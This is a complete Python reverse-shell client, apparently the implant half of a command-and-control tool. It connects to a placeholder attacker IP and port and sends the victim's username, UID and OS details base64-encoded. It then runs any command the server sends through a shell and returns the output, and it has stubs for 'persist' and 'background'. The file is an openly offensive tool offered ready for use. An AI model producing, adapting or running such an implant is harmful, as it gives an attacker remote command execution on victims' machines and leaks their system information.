import os
import platform
import pwd
import socket
import subprocess
import time
import base64


def inbound():
    print("[+] Awaiting response...")
    message = ""
    while True:
        try:
            message = sock.recv(1024).decode()
            message = base64.b64decode(message)
            message = message.decode().strip()
            return message
        except Exception:
            sock.close()


def outbound(message):
    response = str(message)
    response = base64.b64encode(bytes(response, encoding='utf'))
    sock.send(response)


def session_handler():
    try:
        print(f"[+] Connecting to {host_ip}.")
        sock.connect((host_ip, host_port))
        outbound(pwd.getpwuid(os.getuid())[0])
        outbound(os.getuid())
        time.sleep(1)
        op_sys = platform.uname()
        op_sys = f"{op_sys[0]} {op_sys[2]}"
        outbound(op_sys)
        print(f"[+] Connected to {host_ip}.")
        while True:
            message = inbound()
            print(f"[+] Message received: {message}")
            if message == "exit":
                print("[-] The server has terminated the session.")
                sock.close()
                break
            elif message == "persist":
                pass
            elif message.split(" ")[0] == "cd":
                try:
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f"[+] Changed to {cur_dir}")
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound("Invalid directory. Try again.")
                    continue
            elif message == "background":
                pass
            else:
                result = subprocess.run(message, shell=True, capture_output=True)
                output = result.stdout + result.stderr
                outbound(output.decode())
    except ConnectionRefusedError:
        pass


if __name__ == "__main__":
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = "INPUT_IP_HERE"
        host_port = int("INPUT_PORT_HERE")
        session_handler()
    except IndexError:
        print("[-] Command line arguement(s) missing. Please try again.")
    except Exception as e:
        print(e)
